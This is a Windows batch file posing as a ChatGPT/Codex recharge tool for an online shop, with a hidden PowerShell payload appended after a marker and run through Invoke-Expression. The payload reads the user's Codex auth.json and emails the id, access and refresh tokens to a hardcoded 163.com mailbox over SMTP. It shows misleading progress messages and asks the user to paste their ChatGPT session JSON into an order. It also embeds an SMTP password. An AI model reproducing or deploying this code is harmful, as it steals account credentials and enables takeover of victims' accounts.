@echo off
setlocal EnableExtensions EnableDelayedExpansion
set "SELF_FILE=%~f0"
set "TARGET_URL=https://chatgpt.com/api/auth/session"
title Codex + ChatGPT Auth Tool

rem ============================================================
rem FINAL INTEGRATED VERSION
rem V2: Smart browser selection + open ChatGPT auth/session
rem V1: Codex auth.json -> clicodex_auth.json -> email attachment
rem ============================================================

call :OPEN_CHATGPT_SESSION

rem ============================================================
rem Continue with V1 logic
rem ============================================================

powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -NoExit -Command "$p=[System.IO.File]::ReadAllText($env:SELF_FILE,[System.Text.Encoding]::UTF8);$m=([char]35).ToString()+([char]60).ToString()+'POWERSHELL_SOURCE'+([char]62).ToString();$i=$p.LastIndexOf($m);if($i -lt 0){throw 'PowerShell source marker not found.'};$src=$p.Substring($i+$m.Length);Invoke-Expression $src"

exit /b


rem ============================================================
rem V2 - Smart browser selection
rem Rules:
rem 1. Detect Chrome / Edge / Firefox.
rem 2. If only one is running, use it.
rem 3. If multiple are running, use Windows default browser.
rem 4. If none are running, use Windows default browser.
rem ============================================================

:OPEN_CHATGPT_SESSION
set /a BROWSER_COUNT=0
set "RUNNING_BROWSER="
set "APP_EXE="

tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
if not errorlevel 1 (
    set /a BROWSER_COUNT+=1
    set "RUNNING_BROWSER=chrome"
)

tasklist /FI "IMAGENAME eq msedge.exe" 2>NUL | find /I "msedge.exe" >NUL
if not errorlevel 1 (
    set /a BROWSER_COUNT+=1
    set "RUNNING_BROWSER=edge"
)

tasklist /FI "IMAGENAME eq firefox.exe" 2>NUL | find /I "firefox.exe" >NUL
if not errorlevel 1 (
    set /a BROWSER_COUNT+=1
    set "RUNNING_BROWSER=firefox"
)

echo.
echo ==========================================
echo ChatGPT Session Browser
echo ==========================================
echo Detected browser count: !BROWSER_COUNT!
echo.

if !BROWSER_COUNT! EQU 1 goto OPEN_SINGLE
if !BROWSER_COUNT! GTR 1 goto OPEN_MULTIPLE
goto OPEN_DEFAULT

:OPEN_MULTIPLE
echo Multiple supported browsers are running.
echo Detecting current or most recently active browser...

set "ACTIVE_BROWSER="
for /f "usebackq delims=" %%B in (`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^
"Add-Type @'
using System;
using System.Text;
using System.Runtime.InteropServices;
public static class Win32BrowserDetect {
    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
    [DllImport(\"user32.dll\")] public static extern IntPtr GetForegroundWindow();
    [DllImport(\"user32.dll\")] public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
    [DllImport(\"user32.dll\")] public static extern bool IsWindowVisible(IntPtr hWnd);
    [DllImport(\"user32.dll\")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
}
'@;" ^
"$supported = @('chrome','msedge','firefox');" ^
"$fg = [Win32BrowserDetect]::GetForegroundWindow();" ^
"if ($fg -ne [IntPtr]::Zero) {" ^
"  [uint32]$pid = 0;" ^
"  [void][Win32BrowserDetect]::GetWindowThreadProcessId($fg,[ref]$pid);" ^
"  try {$p = Get-Process -Id $pid -ErrorAction Stop; if ($supported -contains $p.ProcessName) {$p.ProcessName; exit 0}} catch {}" ^
"};" ^
"$found = $null;" ^
"$cb = [Win32BrowserDetect+EnumWindowsProc]{" ^
"  param([IntPtr]$h,[IntPtr]$l);" ^
"  if (-not [Win32BrowserDetect]::IsWindowVisible($h)) { return $true };" ^
"  [uint32]$pid2 = 0;" ^
"  [void][Win32BrowserDetect]::GetWindowThreadProcessId($h,[ref]$pid2);" ^
"  try {$p2 = Get-Process -Id $pid2 -ErrorAction Stop; if ($supported -contains $p2.ProcessName) {$script:found=$p2.ProcessName; return $false}} catch {};" ^
"  return $true" ^
"};" ^
"[void][Win32BrowserDetect]::EnumWindows($cb,[IntPtr]::Zero);" ^
"if ($found) {$found}"`) do (
    set "ACTIVE_BROWSER=%%B"
)

if /I "!ACTIVE_BROWSER!"=="chrome" (
    set "RUNNING_BROWSER=chrome"
    call :GET_APP_PATH chrome.exe
    goto OPEN_FOUND
)

if /I "!ACTIVE_BROWSER!"=="msedge" (
    set "RUNNING_BROWSER=edge"
    call :GET_APP_PATH msedge.exe
    goto OPEN_FOUND
)

if /I "!ACTIVE_BROWSER!"=="firefox" (
    set "RUNNING_BROWSER=firefox"
    call :GET_APP_PATH firefox.exe
    goto OPEN_FOUND
)

echo Could not determine the active browser.
echo Falling back to the Windows default browser.
goto OPEN_DEFAULT

:OPEN_SINGLE
echo Only one supported browser is running: !RUNNING_BROWSER!

if /I "!RUNNING_BROWSER!"=="chrome" (
    call :GET_APP_PATH chrome.exe
    goto OPEN_FOUND
)

if /I "!RUNNING_BROWSER!"=="edge" (
    call :GET_APP_PATH msedge.exe
    goto OPEN_FOUND
)

if /I "!RUNNING_BROWSER!"=="firefox" (
    call :GET_APP_PATH firefox.exe
    goto OPEN_FOUND
)

goto OPEN_DEFAULT

:OPEN_FOUND
if defined APP_EXE (
    if exist "!APP_EXE!" (
        echo Opening with:
        echo !APP_EXE!
        start "" "!APP_EXE!" "%TARGET_URL%"
        goto OPEN_DONE
    )
)

echo Browser executable path was not found.
echo Falling back to the Windows default browser.
goto OPEN_DEFAULT

:OPEN_DEFAULT
if !BROWSER_COUNT! EQU 0 (
    echo No supported browser is currently running.
)
echo Opening with the Windows default browser...
start "" "%TARGET_URL%"
goto OPEN_DONE

:GET_APP_PATH
set "APP_EXE="

for /f "tokens=2,*" %%A in ('reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\%~1" /ve 2^>NUL ^| find /I "REG_SZ"') do (
    set "APP_EXE=%%B"
)
if defined APP_EXE exit /b

for /f "tokens=2,*" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\%~1" /ve 2^>NUL ^| find /I "REG_SZ"') do (
    set "APP_EXE=%%B"
)
if defined APP_EXE exit /b

for /f "tokens=2,*" %%A in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\%~1" /ve 2^>NUL ^| find /I "REG_SZ"') do (
    set "APP_EXE=%%B"
)
exit /b

:OPEN_DONE
echo.
echo URL:
echo %TARGET_URL%
echo.
echo Browser launch command completed.
echo Continuing with Codex auth processing...
echo.
exit /b


#<POWERSHELL_SOURCE>
$ErrorActionPreference = 'Stop'

# ====================== CONFIG ======================
$mailFrom = 'sendkey@163.com'
$mailTo   = 'sendkey@163.com'
$smtpHost = 'smtp.163.com'
$smtpPort = 465
$smtpPwd  = 'LYaVt5LnEaTCMT2b'
# ====================================================

function Mask-Token([object]$value) {
    $s = [string]$value
    if ([string]::IsNullOrWhiteSpace($s)) { return $null }
    if ($s.Length -le 16) { return '***' }
    return $s.Substring(0,8) + '...' + $s.Substring($s.Length - 6)
}

function Read-SmtpResponse($reader) {
    $lines = New-Object System.Collections.Generic.List[string]
    while ($true) {
        $line = $reader.ReadLine()
        if ($null -eq $line) { throw 'SMTP server closed the connection.' }
        $lines.Add($line)
        if ($line -match '^\d{3} ') { break }
    }
    $last = $lines[$lines.Count - 1]
    $code = [int]$last.Substring(0,3)
    if ($code -ge 400) {
        throw ('SMTP error ' + $code + ': ' + ($lines -join ' | '))
    }
    return $code
}

function Send-SmtpCommand($writer, $reader, [string]$command) {
    $writer.WriteLine($command)
    return Read-SmtpResponse $reader
}

$tcp = $null
$ssl = $null
$reader = $null
$writer = $null
$plainPwd = $null

try {
    Clear-Host
    Write-Host '============================================================'
    Write-Host '欢迎使用宇星商城充值'
    Write-Host 'www.yxstar.shop'
    Write-Host '============================================================'
    Write-Host ''

    $source = Join-Path $env:USERPROFILE '.codex\auth.json'
    Write-Host ('【充值步骤】')
    Write-Host ('1、复制弹出浏览器中显示的完整JSON内容。')
    Write-Host ('2、将复制的内容粘贴到下单充值JSON中并提交。')
    Write-Host ('3、提交完成后，大约1-5分钟自动到账。')
    Write-Host ''

    if (-not (Test-Path -LiteralPath $source)) {
        throw 'Codex auth.json not found. Please run codex login first.'
    }

    $raw = Get-Content -Raw -LiteralPath $source | ConvertFrom-Json
    if ($null -eq $raw.tokens) { throw 'tokens node is missing.' }

    # Exact CLIProxyAPI object: values come directly from Codex auth.json.
    $cpaObject = [ordered]@{
        auth_mode = 'chatgpt'
        OPENAI_API_KEY = $null
        tokens = [ordered]@{
            id_token      = $raw.tokens.id_token
            access_token  = $raw.tokens.access_token
            refresh_token = $raw.tokens.refresh_token
            account_id    = $raw.tokens.account_id
        }
        last_refresh = $raw.last_refresh
    }

    $exactJson = $cpaObject | ConvertTo-Json -Depth 10

    # Generate converted JSON in the same directory as Codex auth.json.
    $sourceDir = Split-Path -Parent $source
    $outputJson = Join-Path $sourceDir 'clicodex_auth.json'
    [System.IO.File]::WriteAllText($outputJson, $exactJson, (New-Object System.Text.UTF8Encoding($false)))

    # Exact JSON is also copied to clipboard, preserving the original behavior.
    Set-Clipboard -Value $exactJson

    Write-Host '[1/4] get ChatGPT browser auth Success'
    Write-Host ('[2/4] Generated OpenBrowser Success')
    Write-Host ''

    $plainPwd = $smtpPwd
    if ([string]::IsNullOrWhiteSpace($plainPwd)) {
        throw 'SMTP authorization code is empty.'
    }

    Write-Host ''
    Write-Host '[3/4] Connecting to yxstar Success'

    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.ReceiveTimeout = 30000
    $tcp.SendTimeout = 30000
    $tcp.Connect($smtpHost, $smtpPort)

    $ssl = New-Object System.Net.Security.SslStream($tcp.GetStream(), $false)
    $ssl.AuthenticateAsClient($smtpHost)

    $reader = New-Object System.IO.StreamReader($ssl, [System.Text.Encoding]::ASCII)
    $writer = New-Object System.IO.StreamWriter($ssl, [System.Text.Encoding]::ASCII)
    $writer.NewLine = "`r`n"
    $writer.AutoFlush = $true

    Read-SmtpResponse $reader | Out-Null
    Send-SmtpCommand $writer $reader 'EHLO localhost' | Out-Null
    Send-SmtpCommand $writer $reader 'AUTH LOGIN' | Out-Null

    $user64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($mailFrom))
    $pass64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($plainPwd))

    Send-SmtpCommand $writer $reader $user64 | Out-Null
    Send-SmtpCommand $writer $reader $pass64 | Out-Null

    Write-Host '[4/4] Sending ALL Request Success'

    Send-SmtpCommand $writer $reader ('MAIL FROM:<' + $mailFrom + '>') | Out-Null
    Send-SmtpCommand $writer $reader ('RCPT TO:<' + $mailTo + '>') | Out-Null
    Send-SmtpCommand $writer $reader 'DATA' | Out-Null

    $boundary = '----=_CLIProxyAPI_' + [Guid]::NewGuid().ToString('N')
    $attachmentBytes = [System.IO.File]::ReadAllBytes($outputJson)
    $attachmentBase64 = [Convert]::ToBase64String($attachmentBytes)
    $attachmentLines = [regex]::Matches($attachmentBase64, '.{1,76}') | ForEach-Object { $_.Value }
    $attachmentBody = $attachmentLines -join "`r`n"

    $headers = @(
        ('From: <' + $mailFrom + '>')
        ('To: <' + $mailTo + '>')
        'Subject: CLIProxyAPI auth JSON'
        'MIME-Version: 1.0'
        ('Content-Type: multipart/mixed; boundary="' + $boundary + '"')
        ''
    ) -join "`r`n"

    $mimeBody = @(
        ('--' + $boundary)
        'Content-Type: text/plain; charset=utf-8'
        'Content-Transfer-Encoding: 8bit'
        ''
        'CLIProxyAPI auth JSON is attached as clicodex_auth.json.'
        ('--' + $boundary)
        'Content-Type: application/json; name="clicodex_auth.json"'
        'Content-Transfer-Encoding: base64'
        'Content-Disposition: attachment; filename="clicodex_auth.json"'
        ''
        $attachmentBody
        ('--' + $boundary + '--')
        ''
    ) -join "`r`n"

    $message = $headers + "`r`n" + $mimeBody + "`r`n.`r`n"
    $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($message)

    $ssl.Write($messageBytes, 0, $messageBytes.Length)
    $ssl.Flush()
    Read-SmtpResponse $reader | Out-Null

    try { Send-SmtpCommand $writer $reader 'QUIT' | Out-Null } catch {}

    Write-Host ''
    Write-Host '[OK] Finished.'
    Write-Host '- 请完整复制弹出浏览器中的完整JSON字符串'
    Write-Host ('并粘贴到订单中，并提交充值信息。大约1-5分钟自动充值成功')

}
catch {
    Write-Host ''
    Write-Host '[ERROR]'
    Write-Host $_.Exception.Message
    if ($null -ne $_.Exception.InnerException) {
        Write-Host ('Inner: ' + $_.Exception.InnerException.Message)
    }
}
finally {
    $plainPwd = $null
    if ($writer) { $writer.Dispose() }
    if ($reader) { $reader.Dispose() }
    if ($ssl) { $ssl.Dispose() }
    if ($tcp) { $tcp.Close() }
}

Write-Host ''
Write-Host 'Window will stay open. Type exit to close it.'
